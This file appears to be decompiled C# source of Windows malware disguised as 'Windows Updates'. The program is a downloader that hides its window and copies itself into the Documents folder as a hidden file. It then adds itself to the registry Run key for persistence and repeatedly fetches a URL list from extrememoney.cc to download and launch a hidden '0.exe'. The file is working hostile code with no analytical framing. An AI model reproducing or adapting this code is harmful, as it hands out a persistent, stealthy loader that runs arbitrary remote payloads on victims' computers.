using System;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace windows_update;

[DesignerGenerated]
public class ijl5402 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("es24d0fe")]
	private Timer timer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_1;

	private string string_0;

	private int int_0;

	private string string_1;

	private int int_1;

	public ijl5402()
	{
		((Form)this).add_Load((EventHandler)ijl5402_Load);
		string_0 = "http://extrememoney.cc/Text%20History/links.txt";
		int_0 = 60000;
		int_1 = 0;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ijl5402));
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		vmethod_0().set_Interval(20000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("ijl5402");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Windows Updates");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_1(Timer timer_2)
	{
		EventHandler eventHandler = method_0;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_2;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_2()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_3(Timer timer_2)
	{
		EventHandler eventHandler = method_1;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_2;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	public static void ergsx(string Name, string Path)
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(Name, Path, RegistryValueKind.String);
	}

	private void ijl5402_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					((Control)this).Hide();
					goto IL_0008;
				case 383:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001b;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_005a;
						case 6:
							goto IL_006c;
						case 7:
							goto IL_0079;
						case 9:
							goto IL_008b;
						case 10:
							goto IL_008e;
						case 11:
							goto IL_00c3;
						case 12:
							goto IL_00ea;
						case 8:
						case 13:
						case 14:
						case 15:
							goto IL_0116;
						case 16:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0116:
					num = 15;
					Class7.smethod_2(bool_0: true);
					break;
					IL_0008:
					num = 2;
					vmethod_0().set_Interval(int_0);
					goto IL_001b;
					IL_001b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0022;
					IL_0022:
					num = 4;
					if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Windows Updates.exe", false) == 0)
					{
						goto IL_005a;
					}
					goto IL_008b;
					IL_005a:
					num = 5;
					ergsx(((Form)this).get_Text(), Application.get_ExecutablePath());
					goto IL_006c;
					IL_006c:
					num = 6;
					vmethod_2().Start();
					goto IL_0079;
					IL_0079:
					num = 7;
					vmethod_0().Start();
					goto IL_0116;
					IL_008b:
					num = 9;
					goto IL_008e;
					IL_008e:
					num = 10;
					FileSystem.FileCopy(Process.GetCurrentProcess().MainModule!.FileName, ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Windows Updates.exe");
					goto IL_00c3;
					IL_00c3:
					num = 11;
					Process.Start(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Windows Updates.exe");
					goto IL_00ea;
					IL_00ea:
					num = 12;
					File.SetAttributes(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Windows Updates.exe", FileAttributes.Hidden);
					ProjectData.EndApp();
					goto IL_0116;
					end_IL_0000_2:
					break;
				}
				ProjectData.ClearProjectError();
				num3 = 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 383;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_0(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		HttpWebRequest httpWebRequest = default(HttpWebRequest);
		HttpWebResponse httpWebResponse = default(HttpWebResponse);
		StreamReader streamReader = default(StreamReader);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 665:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0026;
						case 4:
							goto IL_0039;
						case 5:
							goto IL_004d;
						case 6:
							goto IL_005c;
						case 7:
							goto IL_006b;
						case 8:
							goto IL_007a;
						case 9:
							goto IL_00af;
						case 10:
							goto IL_00e0;
						case 11:
							goto IL_0117;
						case 12:
							goto IL_013f;
						case 13:
							goto IL_014d;
						case 15:
							goto IL_0180;
						case 16:
							goto IL_0184;
						case 17:
							goto IL_01bb;
						case 18:
							goto IL_01e3;
						case 19:
							goto IL_01f1;
						case 14:
						case 20:
						case 21:
						case 22:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 23:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_01f1:
					num = 19;
					Process.Start(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\0.exe", Conversions.ToString(true));
					break;
					IL_0007:
					num = 2;
					if (Operators.CompareString(string_1, Class9.smethod_0().url, false) == 0)
					{
						break;
					}
					goto IL_0026;
					IL_0026:
					num = 3;
					Class9.smethod_0().url = string_1;
					goto IL_0039;
					IL_0039:
					num = 4;
					httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
					goto IL_004d;
					IL_004d:
					num = 5;
					httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
					goto IL_005c;
					IL_005c:
					num = 6;
					streamReader = new StreamReader(httpWebResponse.GetResponseStream());
					goto IL_006b;
					IL_006b:
					num = 7;
					string_1 = streamReader.ReadLine();
					goto IL_007a;
					IL_007a:
					num = 8;
					if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\0.exe"))
					{
						goto IL_00af;
					}
					goto IL_0180;
					IL_00af:
					num = 9;
					((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\0.exe");
					goto IL_00e0;
					IL_00e0:
					num = 10;
					((ServerComputer)Class1.smethod_0()).get_Network().DownloadFile(string_1, ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\0.exe");
					goto IL_0117;
					IL_0117:
					num = 11;
					File.SetAttributes(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\0.exe", FileAttributes.Hidden);
					goto IL_013f;
					IL_013f:
					num = 12;
					((ApplicationSettingsBase)Class9.smethod_0()).Save();
					goto IL_014d;
					IL_014d:
					num = 13;
					Process.Start(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\0.exe", Conversions.ToString(true));
					break;
					IL_0180:
					num = 15;
					goto IL_0184;
					IL_0184:
					num = 16;
					((ServerComputer)Class1.smethod_0()).get_Network().DownloadFile(string_1, ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\0.exe");
					goto IL_01bb;
					IL_01bb:
					num = 17;
					File.SetAttributes(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\0.exe", FileAttributes.Hidden);
					goto IL_01e3;
					IL_01e3:
					num = 18;
					((ApplicationSettingsBase)Class9.smethod_0()).Save();
					goto IL_01f1;
					end_IL_0000_2:
					break;
				}
				ProjectData.ClearProjectError();
				num3 = 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 665;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 120:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_002d;
						case 4:
							goto IL_003f;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_003f:
					num = 4;
					Class7.smethod_2(bool_0: true);
					break;
					IL_0007:
					num = 2;
					File.SetAttributes(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Windows Updates.exe", FileAttributes.Hidden);
					goto IL_002d;
					IL_002d:
					num = 3;
					ergsx(((Form)this).get_Text(), Application.get_ExecutablePath());
					goto IL_003f;
					end_IL_0000_2:
					break;
				}
				ProjectData.ClearProjectError();
				num3 = 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 120;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
